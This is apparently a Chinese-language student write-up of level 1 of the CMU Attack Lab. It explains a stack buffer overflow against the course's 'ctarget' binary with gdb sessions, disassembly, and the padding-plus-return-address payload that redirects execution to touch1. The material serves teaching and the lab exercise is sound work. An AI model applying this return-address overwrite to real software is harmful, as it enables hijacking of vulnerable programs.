# 要求

要求就是使用缓冲区溢出的漏洞，进行 code injection(CI) 攻击。

我们使用 objdump 来生成完整的 ctarget 反汇编代码
```shell
objdump -d ctarget > ctarget.asm
```

## 重要文件说明


- `exploit1.txt` 为我们输入的注入代码。需要使用 hex2raw 转换为机器字节顺序
- `ctarget` 是 code injection 执行文件

## 解题过程

![image](https://user-images.githubusercontent.com/9459488/147568993-812832c1-1a92-480b-b810-73415024105f.png)


其核心在于，当 P 调用 call Q 指令时，会把 P 的下一条指令地址压栈。当 Q 执行完 ret 时，会取刚刚压入的地址，作为 rip(PC) 指向的地址。

所以该题的核心就是替换掉 P 指令地址为 Q。

即：使用 touch1 函数开始的指令地址替换 test 函数中 getbuf 的下一条指令地址。

```shell
# 执行 ctarget，不连接服务器
r -q

# 打断点
b test
b getbuf

# 显示汇编视图
layout asm
```


以下是关键函数的摘抄

**test**
```nasm
0x401968 <test>         sub    $0x8,%rsp
0x40196c <test+4>       mov    $0x0,%eax
0x401971 <test+9>       callq  0x4017a8 <getbuf>
0x401976 <test+14>      mov    %eax,%edx
0x401978 <test+16>      mov    $0x403188,%esi # x/s $rsi 输出 "No exploit.  Getbuf returned 0x%x\n"
0x40197d <test+21>      mov    $0x1,%edi
0x401982 <test+26>      mov    $0x0,%eax
0x401987 <test+31>      callq  0x400df0 <__printf_chk@plt>
0x40198c <test+36>      add    $0x8,%rsp
0x401990 <test+40>      retq
```

**getbuf**
```nasm
0x4017a8 <getbuf>       sub    $0x28,%rsp
0x4017ac <getbuf+4>     mov    %rsp,%rdi
0x4017af <getbuf+7>     callq  0x401a40 <Gets>
0x4017b4 <getbuf+12>    mov    $0x1,%eax
0x4017b9 <getbuf+17>    add    $0x28,%rsp
0x4017bd <getbuf+21>    retq
0x4017be                nop
0x4017bf                nop
0x4017c0 <touch1>       sub    $0x8,%rsp
0x4017c4 <touch1+4>     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
0x4017ce <touch1+14>    mov    $0x4030c5,%edi
0x4017d3 <touch1+19>    callq  0x400cc0 <puts@plt>
0x4017d8 <touch1+24>    mov    $0x1,%edi
0x4017dd <touch1+29>    callq  0x401c8d <validate>
0x4017e2 <touch1+34>    mov    $0x0,%edi
0x4017e7 <touch1+39>    callq  0x400e40 <exit@plt>
```

getbuf 的 backtrace 信息，我们看到 `saved rip = 0x401976`，这里 `0x401976` 指向的是 test 函数中，call getbuf 的下一条指令地址。

__同时，也是我们期望覆盖的指令地址（我们希望用 touch1 的指令地址 `0x4017c0` 覆盖原来 test 的指令地址 `0x401976`）。__

我们看到 getbuf 开始就开辟了 0x28 的函数栈帧( getbuf's stack frame )。
而上一个函数过程 test 的栈帧的最后一部分，是放着返回地址的。

![image](https://user-images.githubusercontent.com/9459488/147568993-812832c1-1a92-480b-b810-73415024105f.png)

所以我们填充完 getbuf 开辟的地址，把 touch1 的写入到 “返回地址” 里即可。


```nasm
0x4017a8 <getbuf>       sub    $0x28,%rsp
0x4017ac <getbuf+4>     mov    %rsp,%rdi
0x4017af <getbuf+7>     callq  0x401a40 <Gets>
0x4017b4 <getbuf+12>    mov    $0x1,%eax
0x4017b9 <getbuf+17>    add    $0x28,%rsp
0x4017bd <getbuf+21>    retq
```


## 验证

```shell
➜  target1 git:(main) ✗ ./hex2raw < exploit1.txt > raw1.txt


➜  target1 git:(main) ✗ ./ctarget -q -i raw1.txt
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA C0 17 40 00 00 00 00 00
```



## 附录

使用 backtrace 来跟踪函数栈

break _IO_getc@plt ()
```text
(gdb) backtrace
#0  0x0000000000400dc0 in _IO_getc@plt ()
#1  0x0000000000401a73 in Gets (dest=dest@entry=0x5561dc78 "") at support.c:169
#2  0x00000000004017b4 in getbuf () at buf.c:14
#3  0x0000000000401976 in test () at visible.c:92
#4  0x0000000000401f24 in launch (offset=<optimized out>) at support.c:295
#5  0x0000000000401ffa in stable_launch (offset=<optimized out>) at support.c:340
Backtrace stopped: Cannot access memory at address 0x55686000


#0  0x0000000000400dc0 in _IO_getc@plt ()
(gdb) select-frame 0
(gdb) i f
Stack level 0, frame at 0x5561dc58:
 rip = 0x400dc0 in _IO_getc@plt; saved rip = 0x401a73
 called by frame at 0x5561dc78
 Arglist at 0x5561dc48, args:
 Locals at 0x5561dc48, Previous frame's sp is 0x5561dc58
 Saved registers:
  rip at 0x5561dc50


#1  0x0000000000401a73 in Gets (dest=dest@entry=0x5561dc78 "") at support.c:169 
(gdb) select-frame 1
(gdb) i f
Stack level 1, frame at 0x5561dc78:
 rip = 0x401a73 in Gets (support.c:169); saved rip = 0x4017b4
 called by frame at 0x5561dca8, caller of frame at 0x5561dc58
 source language c.
 Arglist at 0x5561dc50, args: dest=dest@entry=0x5561dc78 ""
 Locals at 0x5561dc50, Previous frame's sp is 0x5561dc78
 Saved registers:
  rbx at 0x5561dc58, rbp at 0x5561dc60, r12 at 0x5561dc68, rip at 0x5561dc70


#2  0x00000000004017b4 in getbuf () at buf.c:14
(gdb) select-frame 2
(gdb) i f
Stack level 2, frame at 0x5561dca8:
 rip = 0x4017b4 in getbuf (buf.c:14); saved rip = 0x401976
 called by frame at 0x5561dcb8, caller of frame at 0x5561dc78
 source language c.
 Arglist at 0x5561dc70, args:
 Locals at 0x5561dc70, Previous frame's sp is 0x5561dca8
 Saved registers:
  rip at 0x5561dca0


#3  0x0000000000401976 in test () at visible.c:92
(gdb) select-frame 3
(gdb) i f
Stack level 3, frame at 0x5561dcb8:
 rip = 0x401976 in test (visible.c:92); saved rip = 0x401f24
 called by frame at 0x55685ff8, caller of frame at 0x5561dca8
 source language c.
 Arglist at 0x5561dca0, args:
 Locals at 0x5561dca0, Previous frame's sp is 0x5561dcb8
 Saved registers:
  rip at 0x5561dcb0
(gdb)
```

回归到内存分布上，我们知道代码段在低位，栈在高位。结合本示例，得到

- 0x401976 类似的是 rip(pc指针) 指向的位置，即代码位置
- 0x5561dca8 类似的高位地址表示的是栈位置，即 rsp 指向的位置
  > rbx rbp r12~r15 是被调用者保存 callee saved 寄存器
